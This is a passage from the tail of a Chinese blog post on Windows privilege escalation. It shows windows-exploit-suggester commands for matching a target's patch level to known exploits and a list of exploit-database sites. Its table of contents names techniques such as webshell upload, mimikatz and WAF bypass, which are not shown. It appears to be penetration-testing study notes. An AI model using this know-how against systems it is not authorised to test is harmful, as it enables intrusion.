+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">windows-exploit-suggester.py --database 2019-01-01-mssb.xls --systeminfo a.txt</span><br><span class="line">windows-exploit-suggester.py --audit --database 2019-01-01-mssb.xls --systeminfo a.txt</span><br><span class="line">windows-exploit-suggester.py --audit -l --database 2019-01-01-mssb.xls --systeminfo a.txt</span><br></pre></td></tr></table></figure>
+<h3 id="常用的漏洞库网站"><a class="markdownIt-Anchor" href="#常用的漏洞库网站"></a> 常用的漏洞库网站</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">https://exploit-db.com</span><br><span class="line">https://packetstormsecurity.com</span><br><span class="line">https://packetstormsecurity.com/search/?q=ms15-057</span><br><span class="line">https://www.securityfocus.com/</span><br><span class="line">https://www.securityfocus.com/bid</span><br><span class="line">http://1337day.com</span><br><span class="line">http://0day.today</span><br><span class="line">http://seclists.org/fulldisclosure</span><br><span class="line">http://exploitsearch.net</span><br><span class="line">http://www.securityteam.com</span><br><span class="line">http://metasploit.com/modules</span><br><span class="line">http://securityreason.com</span><br><span class="line">https://cxsecurity.com/exploit</span><br><span class="line">http://securitytracker.com</span><br></pre></td></tr></table></figure>
+<h2 id="使用msf提权"><a class="markdownIt-Anchor" href="#使用msf提权"></a> 使用MSF提权</h2>
+<h2 id="破解服务应用密码提权"><a class="markdownIt-Anchor" href="#破解服务应用密码提权"></a> 破解服务应用密码提权</h2>
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E6%8F%90%E6%9D%83/">提权</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2024/12/14/XSS%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/"
+                                   title="XSS跨站漏洞"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">XSS跨站漏洞</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc left-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E4%B9%8B%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87"><span class="nav-text"> 提权之前的准备</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="nav-text"> 收集信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="nav-text"> 信息收集常用的命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-text"> 下载文件到服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8A%E9%A9%AC%E8%BF%9E%E6%8E%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text"> 上马连接执行命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE-3389"><span class="nav-text"> 查找 3389</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#windows-%E6%8F%90%E6%9D%83"><span class="nav-text"> Windows 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83"><span class="nav-text"> 利用应用程序提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#server-u-%E6%8F%90%E6%9D%83"><span class="nav-text"> Server-U 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#g6ftp-%E6%8F%90%E6%9D%83"><span class="nav-text"> G6ftp 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#filezilla-%E6%8F%90%E6%9D%83"><span class="nav-text"> filezilla 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="nav-text"> 远程管理软件提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#radmin-%E6%8F%90%E6%9D%83"><span class="nav-text"> radmin 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vnc-%E6%8F%90%E6%9D%83"><span class="nav-text"> vnc 提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="nav-text"> 数据库提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mssql-%E6%8F%90%E6%9D%83"><span class="nav-text"> mssql 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E6%8F%90%E6%9D%83"><span class="nav-text"> 绕过安全狗提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql-%E6%8F%90%E6%9D%83"><span class="nav-text"> mysql 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#udf-%E6%8F%90%E6%9D%83"><span class="nav-text"> udf 提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="nav-text"> 启动项提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mof-%E6%8F%90%E6%9D%83"><span class="nav-text"> mof 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E9%93%BE%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83"><span class="nav-text"> 反链端口提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hash%E8%8E%B7%E5%8F%96%E4%B8%8E%E7%A0%B4%E8%A7%A3"><span class="nav-text"> HASH获取与破解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mimikatz-%E4%BD%BF%E7%94%A8"><span class="nav-text"> mimikatz 使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hash-%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7"><span class="nav-text"> hash 破解工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83"><span class="nav-text"> 漏洞利用与提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E6%8F%90%E5%8F%96"><span class="nav-text"> 补丁提取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows-exploit-suggester"><span class="nav-text"> windows-exploit-suggester</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%BA%93%E7%BD%91%E7%AB%99"><span class="nav-text"> 常用的漏洞库网站</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8msf%E6%8F%90%E6%9D%83"><span class="nav-text"> 使用MSF提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A0%B4%E8%A7%A3%E6%9C%8D%E5%8A%A1%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E6%8F%90%E6%9D%83"><span class="nav-text"> 破解服务应用密码提权</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Ehiyor</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+
+    
+
+<!-- 引入 APlayer 和 MetingJS -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script>
+
+<!-- 固定音乐播放器 -->
+<meting-js
+    server="netease"
+    type="playlist"
+    id="7828112982"
+    fixed="true"
+    autoplay="false"
+    order="random"
+    theme="#42b983">
+</meting-js>
+
+
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools left-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83%E4%B9%8B%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87"><span class="nav-text"> 提权之前的准备</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF"><span class="nav-text"> 收集信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="nav-text"> 信息收集常用的命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-text"> 下载文件到服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8A%E9%A9%AC%E8%BF%9E%E6%8E%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="nav-text"> 上马连接执行命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE-3389"><span class="nav-text"> 查找 3389</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#windows-%E6%8F%90%E6%9D%83"><span class="nav-text"> Windows 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%8F%90%E6%9D%83"><span class="nav-text"> 利用应用程序提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#server-u-%E6%8F%90%E6%9D%83"><span class="nav-text"> Server-U 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#g6ftp-%E6%8F%90%E6%9D%83"><span class="nav-text"> G6ftp 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#filezilla-%E6%8F%90%E6%9D%83"><span class="nav-text"> filezilla 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="nav-text"> 远程管理软件提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#radmin-%E6%8F%90%E6%9D%83"><span class="nav-text"> radmin 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vnc-%E6%8F%90%E6%9D%83"><span class="nav-text"> vnc 提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="nav-text"> 数据库提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mssql-%E6%8F%90%E6%9D%83"><span class="nav-text"> mssql 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E6%8F%90%E6%9D%83"><span class="nav-text"> 绕过安全狗提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mysql-%E6%8F%90%E6%9D%83"><span class="nav-text"> mysql 提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#udf-%E6%8F%90%E6%9D%83"><span class="nav-text"> udf 提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="nav-text"> 启动项提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mof-%E6%8F%90%E6%9D%83"><span class="nav-text"> mof 提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E9%93%BE%E7%AB%AF%E5%8F%A3%E6%8F%90%E6%9D%83"><span class="nav-text"> 反链端口提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hash%E8%8E%B7%E5%8F%96%E4%B8%8E%E7%A0%B4%E8%A7%A3"><span class="nav-text"> HASH获取与破解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mimikatz-%E4%BD%BF%E7%94%A8"><span class="nav-text"> mimikatz 使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hash-%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7"><span class="nav-text"> hash 破解工具</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83"><span class="nav-text"> 漏洞利用与提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E6%8F%90%E5%8F%96"><span class="nav-text"> 补丁提取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows-exploit-suggester"><span class="nav-text"> windows-exploit-suggester</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%BA%93%E7%BD%91%E7%AB%99"><span class="nav-text"> 常用的漏洞库网站</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8msf%E6%8F%90%E6%9D%83"><span class="nav-text"> 使用MSF提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A0%B4%E8%A7%A3%E6%9C%8D%E5%8A%A1%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E6%8F%90%E6%9D%83"><span class="nav-text"> 破解服务应用密码提权</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+<script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/utils.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/header-shrink.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/back2top.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/toggle-theme.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/code-block.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/main.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/local-search.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/lazyload.js"></script>
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/post/post-helper.js"></script>
+
+        <!-- toc -->
+        
+            <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/post/toc.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+            <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/post/share.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+    
+        
+    
+
+</body>
+
+</html>
